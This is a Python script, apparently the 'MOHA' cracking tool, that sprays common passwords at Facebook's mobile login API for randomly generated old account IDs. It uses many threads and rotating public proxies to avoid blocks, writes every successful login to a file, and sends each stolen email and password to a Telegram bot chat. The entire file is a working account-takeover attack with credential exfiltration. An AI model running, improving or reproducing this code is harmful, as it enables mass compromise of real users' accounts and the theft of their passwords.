# -*- coding: utf-8 -*-
import os, sys, time, requests, random, uuid, threading, json
from concurrent.futures import ThreadPoolExecutor

# --- Cyber Neon Color Matrix ---
Z = '\033[1;31m'      # Red (Errors)
F = '\033[1;32m'      # Green (Success)
X = '\033[1;33m'      # Yellow (Warnings/Notes)
B = '\033[1;34m'      # Blue (Main)
P = '\033[1;35m'      # Purple (Decorative)
C = '\033[1;36m'      # Cyan (Inputs)
W = '\033[1;37m'      # White
G = '\033[1;90m'      # Gray (Details)

hits, cp, bad = 0, 0, 0
proxy_list = []

def logo():
    os.system('clear')
    # شعار بتنسيق ألوان متدرج (Cyberpunk Style)
    print(f"""
{B}   __  __  ____  _   _    _      ___ ____  
{B}  |  \/  |/ __ \| | | |  / \    / _ \___ \ 
{C}  | |\/| | |  | | |_| | / _ \  | | | |__) |
{C}  | |  | | |__| |  _  |/ ___ \ | |_| / __/ 
{P}  |_|  |_|\____/|_| |_/_/   \_\ \___/_____|
{P}       SYSTEM V3.6 - BY MOHA AL-SHALFAWI
{G}--------------------------------------------------
{W}  [+] Dev   : {C}@m_oha_02
{W}  [+] Status: {F}Premium Edition
{G}--------------------------------------------------""")

def check_connection(token, chat_id):
    """فحص إذا كان البوت شغال والطلبات تصل"""
    print(f"{X}[*] Testing Connection...")
    url = f"https://api.telegram.org/bot{token}/getMe"
    try:
        res = requests.get(url, timeout=10).json()
        if res.get("ok"):
            print(f"{F}[+] Connection Verified! Requests are reaching the bot.")
            return True
        else:
            print(f"{Z}[!] Error: Bot Token is Invalid or Blocked!")
            return False
    except:
        print(f"{Z}[!] Connection Failed: Check your Internet/VPN.")
        return False

def fetch_proxies():
    global proxy_list
    print(f"{C}[*] Rotating Proxies to Bypass Security...")
    try:
        res = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all').text
        proxy_list = res.splitlines()
        print(f"{F}[+] Loaded {len(proxy_list)} Active Proxies.")
    except:
        print(f"{X}[!] Proxy Server Busy, using Direct IP.")

def login_fb(email, pw, chat_id=None, bot_token=None):
    global hits, cp, bad
    ua = "Dalvik/2.1.0 (Linux; U; Android 11; RMX3263) [FBAN/FB4A;FBAV/450.0.0.45.109;]"
    proxy = {"http": random.choice(proxy_list)} if proxy_list else None
    
    url = "https://b-graph.facebook.com/auth/login"
    data = {
        "email": email, "password": pw,
        "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
        "api_key": "882a8490361da98702bf97a021ddc14d",
        "method": "auth.login", "format": "json", "device_id": str(uuid.uuid4())
    }
    
    try:
        res = requests.post(url, data=data, headers={"User-Agent": ua}, proxies=proxy, timeout=7).json()
        if "session_key" in res:
            hits += 1
            print(f"\r{F}[HIT] {email} | {pw} | {res.get('access_token')[:15]}...")
            if bot_token and chat_id:
                msg = f"✅ MOHA HIT!\nUser: {email}\nPass: {pw}\nType: Old Account"
                requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", data={'chat_id':chat_id, 'text':msg})
            open("hits.txt", "a").write(f"{email}:{pw}\n")
        elif "www.facebook.com" in str(res):
            cp += 1
            print(f"\r{X}[CP] {email} | {pw}                      ")
        else:
            bad += 1
            sys.stdout.write(f"\r{G}[Checking] {hits}/{cp}/{bad} | {W}{email[:15]} "); sys.stdout.flush()
    except Exception as e:
        # إذا كان البروكسي محظور أو توقف
        pass

def tool_old_accounts():
    logo()
    print(f"{P}--- Target Selection ---")
    print(f"{B}[1] 2004-2005 (Rare IDs)")
    print(f"{B}[2] 2009 (Old Series)")
    print(f"{B}[3] 2010-2012 (Mid Series)")
    print(f"{B}[4] 2013-2014 (New Series)")
    print(f"{Z}[0] Back")
    
    choice = input(f"\n{C}MOHA-YEAR > ")
    if choice == '0': return

    token = input(f"{W}[+] Bot Token: ")
    chat_id = input(f"{W}[+] Chat ID  : ")
    
    # التحقق من الاتصال قبل البدء
    if not check_connection(token, chat_id):
        input(f"{X}Press Enter to try anyway...")

    fetch_proxies()
    passwords = ['123456', '1234567', '12345678', '123123', '321321', '123456789']
    
    print(f"{F}[*] Engine Started... Hunting in progress.")
    with ThreadPoolExecutor(max_workers=35) as pool:
        while True:
            if choice == '1': uid = str(random.randint(100000, 99000000))
            elif choice == '2': uid = "1000000" + str(random.randint(10000, 99999))
            elif choice == '3': uid = "100001" + str(random.randint(100000, 999999))
            elif choice == '4': uid = "100005" + str(random.randint(100000, 999999))
            else: break

            for pw in passwords:
                pool.submit(login_fb, uid, pw, chat_id, token)

def main():
    while True:
        logo()
        print(f"{B}[1] Start Hunting (Old Accounts)")
        print(f"{B}[2] ID Extractor")
        print(f"{B}[3] File Checker")
        print(f"{Z}[0] Exit")
        
        choice = input(f"\n{C}MOHA-02 > ")
        if choice == '1': tool_old_accounts()
        elif choice == '0': sys.exit()
        else: print(f"{Z}Invalid Selection"); time.sleep(1)

if __name__ == "__main__":
    main()
